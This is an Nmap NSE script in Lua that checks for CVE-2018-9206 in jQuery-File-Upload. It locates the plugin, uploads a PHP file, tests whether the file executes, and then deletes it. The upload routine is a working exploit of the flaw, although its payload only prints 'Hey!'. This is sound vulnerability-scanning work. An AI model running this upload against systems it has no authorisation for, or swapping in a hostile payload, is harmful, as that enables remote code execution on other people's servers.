local http = require 'http'
local io = require 'io'
local json = require 'json'
local rand = require 'rand'
local shortport = require 'shortport'
local stdnse = require 'stdnse'
local table = require 'table'
local url = require 'url'
local vulns = require 'vulns'

description = [[
Unauthenticated arbitrary file upload vulnerability on jQuery-File-Upload <= v9.22.0.

This version doesn't require any validation to upload files to the server.

It also doesn't exclude file types and will allow any file type to be uploaded including
executable files with .php extensions. This allows for remote code execution.
This flaw was introduced when Apache disabled a default security control, .htaccess files,
the library used for file access control. Default support for .htaccess files was
eliminated starting with Apache 2.3.9 (though users can choose to enable it), leaving
unprotected any code that used the feature to impose restrictions on folder access,

References:
* http://www.vapidlabs.com/advisory.php?v=204
* https://threatpost.com/thousands-of-applications-vulnerable-to-rce-via-jquery-file-upload/138501/
]]

---
-- @usage nmap --script http-vuln-cve2018-9206 -p 80,8080,443 --script-args "uri=/" <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2018-9206:
-- |   VULNERABLE:
-- |   jQuery-File-Upload unauthenticated arbitrary file upload vulnerability
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2018-9206
-- |       Unauthenticated arbitrary file upload vulnerability on jQuery-File-Upload <= v9.22.0.
-- |
-- |     Disclosure date: 2018-10-09
-- |     References:
-- |_      http://www.vapidlabs.com/advisory.php?v=204
--
-- @xmloutput
-- <table key='2018-9206'>
-- <elem key='title'>jQuery-File-Upload unauthenticated arbitrary file upload vulnerability</elem>
-- <elem key='state'>VULNERABLE</elem>
-- <table key='ids'>
-- <elem>CVE:CVE-2018-9206</elem>
-- </table>
-- <table key='description'>
-- <elem>Unauthenticated arbitrary file upload vulnerability on jQuery-File-Upload <= v9.22.0.</elem>
-- </table>
-- <table key='dates'>
-- <table key='disclosure'>
-- <elem key='day'>09</elem>
-- <elem key='month'>10</elem>
-- <elem key='year'>2018</elem>
-- </table>
-- </table>
-- <elem key='disclosure'>2018-10-09</elem>
-- <table key='check_results'>
-- </table>
-- <table key='refs'>
-- <elem>http://www.vapidlabs.com/advisory.php?v=204</elem>
-- <elem>https://threatpost.com/thousands-of-applications-vulnerable-to-rce-via-jquery-file-upload/138501/</elem>
-- </table>
-- </table>
--
---

author = 'Kostas Milonas'
license = 'Same as Nmap--See https://nmap.org/book/man-legal.html'
categories = {'vuln', 'intrusive'}

portrule = shortport.http

plugin_names = {
  'jquery-file-upload',
  'jQuery-File-Upload'
}

-- Given the plugin path, checks if the plugin exists
local function plugin_exists(host, port, plugin_path)
  local response = http.get(host, port, plugin_path, { redirect_ok = true, no_cache = true })
  local content_type = response.header['content-type'] or ''

  if response.status == 200 and (content_type:find('^text/plain') or content_type == 'application/json') then
    return true
  end

  return false
end

-- Parse the plugin path to always return an absolute path
local function format_plugin_path(path)
  -- An HTML src value can be a URL, relative path or absolute path
  local path = url.parse(path).path
  if path:sub(1, 1) ~= '/' then
    path = '/' .. path
  end
  return path
end

function parse_tags(body, pattern, callback_success)
  local _, i, tag_name, j
  local path

  -- Loop through elements
  i = 0
  while i do
    -- Match each tag and capture the tag name
    _, i, tag_name = string.find(body, '<%s*(%w+)%s', i + 1)
    if not i then
      break
    end

    -- Loop through attributes
    j = i
    while true do
      -- The tag types that the plugin usually appears. Skip others.
      if not (tag_name == 'script' or tag_name == 'link' or tag_name == 'img' or tag_name == 'a') then
        break
      end

      -- Capture the tag's attribute and value
      local attribute, quote, value
      _, j, attribute, quote, value = string.find(body, '^%s*(%w+)%s*=%s*(["\'])(.-)%2', j + 1)
      if not j then
        break
      end

      -- Get the attribute's value based on the tag name
      path = nil
      if ((tag_name == 'script' or tag_name == 'img') and string.lower(attribute) == 'src')
        or ((tag_name == 'link' or tag_name == 'a') and string.lower(attribute) == 'href') then
        path = value
      end

      -- We had a success getting the value, check if matches the pattern and call the success callback.
      if path ~= nil and string.match(path, pattern) then
        return callback_success(path)
      end
    end
  end
end

-- 1 of 2, plugin identification methods and most accurate.
-- Locates the vulnerable plugin in the given URI's source code.
local function locate_plugin(response_body, host, port)
  local plugin = nil
  local plugin_path = nil
  local plugin_name = nil

  stdnse.debug1('Trying to locate the plugin itself.')

  -- Find if the given URI has the plugin, with either casing
  plugin = parse_tags(response_body, 'j[qQ]uery%-[fF]ile%-[uU]pload', function(value)
      local a, b, path, name, suffix = string.find(value, '(.-)(j[qQ]uery%-[fF]ile%-[uU]pload)(.-)/')
      return { path = path, name = name, suffix = suffix }
    end
  )

  -- If the plugin was not found, fail
  if plugin == nil or plugin.path == nil or plugin.name == nil then
    stdnse.debug1('Plugin not found.')
    return nil
  end

  plugin_path = plugin.path
  plugin_name = plugin.name .. (plugin.suffix or '')

  -- Targets, can have an HTML src attribute value of a URL, relative path or absolute path
  plugin_path = format_plugin_path(plugin_path .. plugin_name .. '/server/php/')
  stdnse.debug1('Plugin URI found: %s', plugin_path)

  -- Test if we can access the vulnerable plugin
  if plugin_exists(host, port, plugin_path) then
    stdnse.debug1('Plugin responded successfully at URI: %s', plugin_path)
    return plugin_path
  end
  stdnse.debug1('Invalid response when requested the plugin URI: %s', plugin_path)

  return nil
end

-- 2 of 2, plugin identification methods, less accurate
-- but useful if the plugin is not just loaded in the URI we are scanning.
-- Locates the plugins directory in the given URI's source code
-- and guesses the path of the vulnerable plugin.
local function locate_plugins_directory(response_body, host, port)
  stdnse.debug1('Trying to locate the plugins directory.')
  local plugins_path = parse_tags(response_body, 'plugins%/', function(value)
      local a, b, plugins_path = string.find(value, '(.-)plugins%/')
      return plugins_path
    end
  )

  -- If the plugins directory was not found, fail
  if plugins_path == nil then
    stdnse.debug1('Plugins directory not found.')
    return nil
  end

  plugins_path = format_plugin_path(plugins_path)
  stdnse.debug1('Plugins directory found in URI: %s', plugins_path)

  -- Try to find the vulnerable plugin
  for i, plugin_name in ipairs(plugin_names) do
    -- Targets, can have an HTML src attribute value of a URL, relative path or absolute path
    local plugin_path = format_plugin_path(plugins_path .. 'plugins/' .. plugin_name .. '/server/php/')
    stdnse.debug1('Testing assumed plugin path: %s', plugin_path)

    -- Test if we made a correct guess about the plugin's location
    if plugin_exists(host, port, plugin_path) then
      stdnse.debug1('Plugin responded successfully at URI: %s', plugin_path)
      return plugin_path
    end
  end

  stdnse.debug1('Plugin not found.')
  return nil
end

-- Exploits the plugin by trying to upload a file
local function exploit(host, port, plugin_path)
  -- Create a random filename and a file content
  random_filename_no_ext = rand.random_alpha(10)
  random_file_ext = '.php'
  random_filename = random_filename_no_ext .. random_file_ext
  content = '<?php echo "Hey!"; ?>'

  -- Prepare the request data to upload the file
  local data = {}
  data['header'] = {}
  data['header']['Content-Type'] = 'multipart/form-data; boundary=AaB03x'
  data['content'] = '--AaB03x\nContent-Disposition: form-data; name="files[]"; filename="' .. random_filename .. '"\nContent-Type: application/x-php\n\n' .. content .. '\n--AaB03x--'

  -- Upload the file
  stdnse.debug1('Trying to upload file: %s', random_filename)
  local response = http.post(host, port, plugin_path, data, { redirect_ok = true, no_cache = true })
  if response.status ~= 200 or response.body:find('error["\']:') then
    stdnse.debug1('Upload failed as the target returned an error.')
    return false
  end
  stdnse.debug1('Upload request was successful.')
  stdnse.debug1('The host is vulnerable, but going to make some additional tests regarding the uploaded file.')

  --
  -- The following do not affect the result if vulnerable or not, they are additional checks.
  --

  -- Check if the file has been uploaded
  response = http.get(host, port, plugin_path, { redirect_ok = true, no_cache = true })
  -- Some plugin versions add a random suffix at the filename
  if response.status == 200 and response.body:match(random_filename_no_ext .. '.*' .. random_file_ext:gsub('%.', '%%.')) then
    stdnse.debug1('Uploaded file exists on the file list!')

    -- Some versions add a random suffix to the uploaded file. Get it!
    local _, _, random_filename_suffix = string.find(response.body, '.*"' .. random_filename_no_ext .. '(.-)' .. random_file_ext:gsub('%.', '%%.') .. '".*')
    random_filename = random_filename_no_ext .. random_filename_suffix .. random_file_ext
  else
    stdnse.debug1('Uploaded file not found on file list. Will continue to evaluate the file assuming the target didn\'t rename it.')
  end

  -- The uploaded files can be stored to a completely different directory than the plugin.
  -- Let's find out the file's real path.
  stdnse.debug1('Getting uploaded file information.')
  response = http.get(host, port, plugin_path .. '/?file=' .. random_filename, { redirect_ok = true, no_cache = true })
  local content_type = response.header['content-type'] or ''
  if response.status ~= 200 or response.body == '' or not (content_type:find('^text/plain') or content_type == 'application/json') then
    stdnse.debug1('Server responded with an error while trying to get the file information.')
    return true
  end

  -- Parse the file information response
  json_status, response_json = json.parse(response.body);
  if json_status == false then
    stdnse.debug1('Could not get file information. JSON response could not be parsed.')
    return true
  end

  local file_path = nil
  if response_json.file and type(response_json.file) == 'table' and response_json.file.url then
    local file_url = response_json.file.url
    -- It is possible that the file URL doesn't have a scheme.
    -- That breaks parsing the URL.
    if url.parse(file_url).scheme == nil then
      file_url = 'http://' .. file_url
    end
    -- Get the path of the uploaded file, so we can request it.
    file_path = url.parse(file_url).path
  else
    stdnse.debug1('Could get the uploaded file URL in JSON response.')
    return true
  end

  -- Check if the file is executable
  stdnse.debug1('Checking if the uploaded file is executable.')
  local message = ''
  response = http.get(host, port, file_path, { redirect_ok = true, no_cache = true })
  if response.status == 200 and response.body == 'Hey!' then
    message = 'File is executable!'
  elseif response.status ~= 200 then
    message = 'Request for uploaded file failed with status "' .. response.status .. '".'
  elseif response.body == content then
    message = 'Uploaded file was found but is not executable (content returned as plain text).'
  else
    message = 'Tried to execute the uploaded file, but an unexpected error happend.'
  end

  stdnse.debug1(message)
  table.insert(vuln_table.extra_info, message)

  -- Delete the file
  stdnse.debug1('Deleting uploaded file.')
  if not response_json.file.deleteUrl then
    stdnse.debug1('Delete URL could not be found in file information.')
    return true
  end
  local delete_url = response_json.file.deleteUrl
  stdnse.debug1('Delete URL found.')

  response = http.generic_request(host, port, 'DELETE', delete_url, { redirect_ok = true, no_cache = true })
  if response.status ~= 200 then
    stdnse.debug1('File could not be deleted.')
  end
  stdnse.debug1('File deleted.')

  return true
end

action = function(host, port)
  vuln_table = {
    title = 'jQuery-File-Upload unauthenticated arbitrary file upload vulnerability',
    IDS = {CVE = 'CVE-2018-9206'},
    description = [[
Unauthenticated arbitrary file upload vulnerability on jQuery-File-Upload <= v9.22.0.
]],
    references = {
      'http://www.vapidlabs.com/advisory.php?v=204',
      'https://threatpost.com/thousands-of-applications-vulnerable-to-rce-via-jquery-file-upload/138501/'
    },
    dates = {
      disclosure = {year = '2018', month = '10', day = '09'},
    },
    check_results = {},
    extra_info = {}
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  vuln_table.state = vulns.STATE.NOT_VULN

  --
  -- Start of actual code
  --
  local uri = stdnse.get_script_args('uri') or '/'
  stdnse.debug1('Testing URI: %s', uri)

  -- Get source code of URI, to try to locate the vulnerable plugin
  local response = nil
  response = http.get(host, port, uri, { redirect_ok = true, no_cache = true })
  if response.status ~= 200 or response == nil or response.body == nil then
    stdnse.debug1('Target returned an invalid response.')
    return vuln_report:make_output(vuln_table)
  end

  -- Method 1, most accurate, locates the plugin in given URI's source
  local plugin_path = nil
  plugin_path = locate_plugin(response.body, host, port)
  -- Method 2, locates the plugins directory in given URI's source
  -- and then assumes the plugin's location
  if plugin_path == nil then
    plugin_path = locate_plugins_directory(response.body, host, port)
  end

  if plugin_path == nil then
    return vuln_report:make_output(vuln_table)
  end

  -- Try to exploit the plugin
  exploit_success = exploit(host, port, plugin_path)
  if exploit_success then
    stdnse.debug1('Vulnerability found!')
    table.insert(vuln_table['extra_info'], 'Vulnerable URI: ' .. plugin_path)
    vuln_table.state = vulns.STATE.VULN
  end

  return vuln_report:make_output(vuln_table)
end
